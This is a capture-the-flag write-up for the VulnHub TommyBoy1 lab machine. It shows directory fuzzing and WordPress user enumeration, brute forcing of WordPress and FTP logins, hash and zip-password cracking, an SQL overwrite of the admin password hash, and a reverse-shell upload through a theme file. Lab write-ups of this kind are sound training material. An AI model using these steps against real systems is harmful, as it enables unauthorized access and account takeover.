# Enumeration
## NMAP
- tcp/22
- tcp/80
- tcp/8008
## FFUF (tcp/80)
```
┌──(root💀kali)-[~/vulnHub/TommyBoy1]
└─# ffuf -u http://192.168.56.129/FUZZ -w /usr/share/wordlists/dirb/common.txt  -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.129/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 301
________________________________________________

.hta                    [Status: 403, Size: 293, Words: 22, Lines: 12]
                        [Status: 200, Size: 1176, Words: 164, Lines: 18]
.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12]
cgi-bin/                [Status: 200, Size: 745, Words: 52, Lines: 16]
index.html              [Status: 200, Size: 1176, Words: 164, Lines: 18]
robots.txt              [Status: 200, Size: 132, Words: 6, Lines: 6]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12]
:: Progress: [4614/4614] :: Job [1/1] :: 429 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

## FFUF (tcp/8008)
```
┌──(root💀kali)-[~/vulnHub/TommyBoy1]
└─# ffuf -u http://192.168.56.129:8008/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.129:8008/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 300, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 300, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 295, Words: 22, Lines: 12]
                        [Status: 200, Size: 295, Words: 35, Lines: 13]
index.html              [Status: 200, Size: 295, Words: 35, Lines: 13]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]
:: Progress: [4614/4614] :: Job [1/1] :: 4853 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

# Obtaining Initial Foothold
## Port 80 (HTTP)
1. Proceed to `/robots`
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1]
	└─# curl http://192.168.56.129/robots.txt
	User-agent: *
	Disallow: /6packsofb...soda
	Disallow: /lukeiamyourfather
	Disallow: /lookalivelowbridge
	Disallow: /flag-numero-uno.txt
	```
2. Proceed to directories in robots.txt
	- `/6packsofb...soda`
	![images/TommyBoy1 6packsofb...soda.png](images/TommyBoy1%206packsofb...soda.png)
	- `/lukeiamyourfather`
		![TommyBoy1 lukeiamyourfather.png](images/TommyBoy1%20lukeiamyourfather.png)
	- `/lookalivelowbridge`
		![TommyBoy1 lookalivelowbridge.png](images/TommyBoy1%20lookalivelowbridge.png)
	- `/flag-numero-uno.txt` (Found 1st Flag)
		![TommyBoy1 Flag1.png](images/TommyBoy1%20Flag1.png)
		- B34rcl4ws
3. Check for any hidden files
	```
	binwalk -eM *
	```
	![TommyBoy1 binwalk.png](images/TommyBoy1%20binwalk.png)
	- No hidden files
4. Proceed to `index.html` & view page source
	![TommyBoy1 index .png](images/TommyBoy1%20index%20.png)
	- Mentioned that hidden web dir can be found in a youtube video
5. Found hidden web directory `/prehistoricforest`
	![](images/Pasted%20image%2020220118053730.png)
	![](images/Pasted%20image%2020220118053835.png)
6.  Enumerate wp users
	```
	wpscan --no-update --disable-tls-checks --url http://tommyboy/prehistoricforest/ -e u -f cli-no-color 2>&1 | tee "/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_users_enum.txt"
	```
	```
	[+] URL: http://tommyboy/prehistoricforest/ [192.168.56.129]

	[i] User(s) Identified:

	[+] michelle
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 | Confirmed By: Login Error Messages (Aggressive Detection)

	[+] richard
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 | Confirmed By: Login Error Messages (Aggressive Detection)

	[+] tom
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 | Confirmed By: Login Error Messages (Aggressive Detection)

	[+] tommy
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 | Confirmed By: Login Error Messages (Aggressive Detection)
	```
	- Store them in a wordlist
7. Enumerate wp plugins
	```
	wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://tommyboy/prehistoricforest/ -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_plugin_enum.txt"
	```
	```
	[i] Plugin(s) Identified:

	[+] akismet
	 | Location: http://tommyboy/prehistoricforest/wp-content/plugins/akismet/
	 | Latest Version: 4.2.1
	 | Last Updated: 2021-10-01T18:28:00.000Z
	 |
	 | Found By: Known Locations (Aggressive Detection)
	 |  - http://tommyboy/prehistoricforest/wp-content/plugins/akismet/, status: 403
	 |
	 | The version could not be determined.
	```
	- Not exploitable
8. Bruteforce
	```
	wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://tommyboy/prehistoricforest/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2>&1 | tee "/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt"
	```
9. While bruteforcing, look for useful information in the wordpress blog
10. Found 2nd Flag
	![](images/Pasted%20image%2020220118054504.png)![](images/Pasted%20image%2020220118163420.png)
11.  Proceed to "Son OF A!" Post
	![](images/Pasted%20image%2020220118055905.png)
12. Proceed to `/richard` & download image
	![](images/Pasted%20image%2020220118055942.png)
13. Check for hidden files/text
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/http]
	└─# exiftool shockedrichard.jpg |grep "User Comment"
	User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b
	```
	- Looks like a hash
14. Crack hash w/ hashcat
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/http]
	└─# hashcat -a 0 -m 0 "ce154b5a8e59c89732bc25d6a2e6b90b" /usr/share/wordlists/rockyou.txt --show
	ce154b5a8e59c89732bc25d6a2e6b90b:spanky
	```
	- spanky
15. Proceed to the password-locked post
	![](images/Pasted%20image%2020220118161803.png)
	- Useful Information 
		- A backup file called `callahanbak.bak`
		- FTP Server that goes online for 15 minutes then down for 15 minutes
		- A user called `nickburns` whose password is easy to guess
16. Do an NMAP Scan again
	```
	PORT      STATE SERVICE
	22/tcp    open  ssh
	80/tcp    open  http
	8008/tcp  open  http
	65534/tcp open  unknown
	```
	- 65534 wasn't up in the initial scan, it is likely the FTP Server
17. Bruteforce
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/exploit/bruteforce]
	└─# hydra -l nickburns -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ftp://$ip -s 65534 -e nsr 
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
	[DATA] attacking ftp://192.168.56.129:65534/
	[65534][ftp] host: 192.168.56.129   login: nickburns   password: nickburns
	1 of 1 target successfully completed, 1 valid password found
	```
	- nickburns:nickburns
## Port 65534 (FTP)
1. Access FTP w/ nickburns:nickburns, check for write access
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp]
	└─# ftp -nv $ip 65534
	Connected to 192.168.56.129.
	220 Callahan_FTP_Server 1.3.5
	ftp> user nickburns
	331 Password required for nickburns
	Password: 
	230 User nickburns logged in
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> put test 
	local: test remote: test
	200 PORT command successful
	150 Opening BINARY mode data connection for test
	226 Transfer complete
	ftp> dir
	200 PORT command successful
	150 Opening ASCII mode data connection for file list
	-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
	-rw-r--r--   1 nickburns nickburns        0 Jan 18 08:10 test
	226 Transfer complete
	ftp> 
	```
	- We have write access
2. Download all files
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp]
	└─# wget -m --no-passive ftp://nickburns:nickburns@$ip:65534
	--2022-01-18 16:44:57--  ftp://nickburns:*password*@192.168.56.129:65534/
			   => ‘192.168.56.129:65534/.listing’
	Connecting to 192.168.56.129:65534... connected.
	Logging in as nickburns ... Logged in!
	```
3. View `readme.txt`
	![](images/Pasted%20image%2020220118165021.png)
	- Useful Information
		- `NickIzL33t` directory
		- "look at on your phone later" suggests that its a web directory
4. Fuzz web directory
	
## Port 8008 (HTTP)
1. Proceed to `index.html`
	![](images/Pasted%20image%2020220118171113.png)
	- Was stuck here for a long time, Steve Job is a hint to switch user-agent to iphone.
2. Switch User-Agent to iphone
	![](images/Pasted%20image%2020220118171426.png)
	- We have to FUZZ for `.html` file
3. Fuzz it
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/ftp/192.168.56.129:65534]
	└─# ffuf -fw 29 -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" -u http://192.168.56.129:8008/NickIzL33t/FUZZ -w /usr/share/wordlists/rockyou.txt -e ".html" 

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.56.129:8008/NickIzL33t/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
	 :: Header           : User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1
	 :: Extensions       : .html 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 29
	________________________________________________
	fallon1.html            [Status: 200, Size: 459, Words: 56, Lines: 13]
	```
	- Found `fallon1.html`
4. Proceed to `fallon1.html`
	![](images/Pasted%20image%2020220118172627.png)
5. Proceed to directories found in `fallon1.html`
	- hint.txt
		![](images/Pasted%20image%2020220118172704.png)
	- flagtres.txt (Flag 3)
		![Pasted image 20220118211730.png](images/Pasted%20image%2020220118211730.png)
	- Big Tom's encrypted pw backups 
		- Password encrypted zip file
## Cracking Zip File
1. Password Requirements
	1. bev
	2. One uppercase character
	3. Two numbers
	4. Two lowercase character
	5. One symbol
	6. 1995
2. Create password generator python script
	```
	#!/usr/bin/python
	#https://docs.python.org/3/library/string.html
	from string import ascii_uppercase
	from string import ascii_lowercase
	from string import punctuation
	for a in ascii_uppercase:
		for b in range(0, 10):
			for c in range (0, 10):
				for d in ascii_lowercase:
					for e in ascii_lowercase:
						for f in punctuation:
							print("bev" + str(a) + str(b) + str(c) + str(d) + str(e) + str(f) + "1995")
	```
3. Generate password word list.
	```
	python passwordgen.py > passwords.txt
	```
4. Download zip
	```
	wget http://192.168.56.129:8008/NickIzL33t/t0msp4ssw0rdz.zip --header="User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
	```
5. Crack zip
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/exploit/bruteforce]
	└─# fcrackzip -v -u -D -p passwords.txt t0msp4ssw0rdz.zip 
	found file 'passwords.txt', (size cp/uc    332/   641, flags 9, chk 9aad)
	checking pw bevG93kv~1995                           
	PASSWORD FOUND!!!!: pw == bevH00tr$1995
	```
6. Unzip & view contents
	![](images/Pasted%20image%2020220118180008.png)
	-  Wordpress Draft contains last 4 digit of password
	-  Stuck here again, famous Queen song has too many possiblities & the password could be the lyrics as well.

## Back to Port 80 (HTTP)

1. Bruteforce against tom's account (tommy, tom) w/ rockyou.txt
	```
	wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://tommyboy/prehistoricforest/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2>&1 | tee "/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt"
	```
	```
	[+] Performing password attack on Wp Login against 2 user/s
	Progress: |== 			|
	[SUCCESS] - tom / tomtom1
	```
2. Login w/ tom:tomtom1 & find draft
	![](images/Pasted%20image%2020220118184353.png)
	- fatguyinalittlecoat1938!!

## SSH 
1. SSH w/ found creds ![](images/Pasted%20image%2020220118185335.png)
2. Obtain 4th flag
	![](images/Pasted%20image%2020220118185550.png)
	- Hint
		- /5.txt
	
# Privilege Escalation

## www-data 
1. Find `5.txt`
	```
	bigtommysenior@CallahanAutoSrv01:/tmp$ find / 2>/dev/null | grep -i 5.txt
	/lib/firmware/ath10k/QCA6174/hw2.1/notice_ath10k_firmware-5.txt
	/lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-5.txt
	/lib/firmware/ath10k/QCA99X0/hw2.0/notice_ath10k_firmware-5.txt
	/.5.txt # <-this
	```
2. Check `/.5.txt` permissions
	```
	bigtommysenior@CallahanAutoSrv01:~$ ls -l /.5.txt
	-rwxr-x--- 1 www-data www-data 520 Jul  7  2016 /.5.txt
	```
3. Obtain creds from `wp-config.php`
	![](images/Pasted%20image%2020220118190358.png)
	- wordpressuser:CaptainLimpWrist!!!
4. Replace wordpress admin user (richard) password w/ tom's
	```
	# First user in the database is usually the admin
	UPDATE wp_users
	SET user_pass = '$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.'
	WHERE ID = 1;
	```
	```
	mysql> UPDATE wp_users
    -> SET user_pass = '$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.'
    -> WHERE ID = 1;
	Query OK, 1 row affected (0.00 sec)
	Rows matched: 1  Changed: 1  Warnings: 0
	```
	- richard:tomtom1
5. Login w/ richard:tomtom1, upload reverse shell 
	![](images/Pasted%20image%2020220118192523.png)
6. Execute reverse shell at 
	- `prehistoricforest/wp-content/themes/twentysixteen/404.php`
7. www-data shell obtained ![](images/Pasted%20image%2020220118192851.png)
8. Obtain 5th flag
	![](images/Pasted%20image%2020220118192927.png)
9. Compile the flags
	```
	┌──(root💀kali)-[~/vulnHub/TommyBoy1]
	└─# python3
	Python 3.9.9 (main, Dec 16 2021, 23:13:29) 
	[GCC 11.2.0] on linux
	Type "help", "copyright", "credits" or "license" for more information.
	>>> print ("B34rcl4ws" + "Z4l1nsky" + "TinyHead" + "EditButton" + "Buttcrack")
	B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
	>>> 
	```
10. Obtain final flag
	![](images/Pasted%20image%2020220118193326.png)
	
	
---
Tags: #tcp/80-http/cms/wordpress #image-forensic  #cracking/fcrackzip #linux-priv-esc/linux-creds-found 

---